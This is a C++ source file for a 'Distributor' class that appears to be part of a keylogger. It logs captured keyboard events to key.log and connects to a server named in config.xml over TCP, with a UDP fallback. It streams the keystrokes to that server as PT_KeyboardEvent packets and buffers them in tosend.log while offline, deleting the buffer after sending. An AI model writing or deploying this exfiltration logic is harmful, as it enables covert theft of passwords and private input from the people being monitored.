#include "Distributor.h"

Distributor::Distributor(void)
{
}

Distributor::~Distributor(void)
{
}

void Distributor::init(void)
{
	std::string ip, port;
	XMLReader config;

	try {
		config.readFromFile(StaticTools::GetProjectResourceDirectory() + "\\config.xml");

		ip = config.getValue<std::string>("config", "ip");
		port = config.getValue<std::string>("config", "port");

		_client = new TCPClient(ip, port);
		try {
			_client->connect();
		}
		catch (std::exception const& /*e*/) {
			delete (_client);
			_client = new UDPClient(ip, port);
			_client->connect();
		}

		_client->run();
		_log.open(StaticTools::GetProjectResourceDirectory() + "\\key.log");
	}
	catch (std::exception const& e) {
		throw (std::runtime_error(e.what()));
	}
	
}

void Distributor::destroy(void)
{
	_client->disconnect();
}

IDistributor &Distributor::operator<<(AInputType &entry)
{
	entry.format(_log.getSize());

	entry >> _log;
	if (_client->isConnected()) {
		if (_tosend.getSize() > 0) {
			sendToSend();
		}
		entry >> *_client;
	}
	else {
		if (!_tosend.isOpen()) {
			_tosend.open(StaticTools::GetProjectResourceDirectory() + "\\tosend.log");
		}
		entry >> _tosend;
	}
	return (*this);
}

void Distributor::sendToSend(void)
{
	_tosend.close();

	std::ifstream ifs(_tosend.getFilename());
	std::string line;

	if (ifs) {
		while (std::getline(ifs, line)) {
			*_client << StaticTools::CreatePacket(PacketType::PT_KeyboardEvent, line + '\n');
		}
		ifs.close();
	}

	boost::filesystem::remove(_tosend.getFilename());
}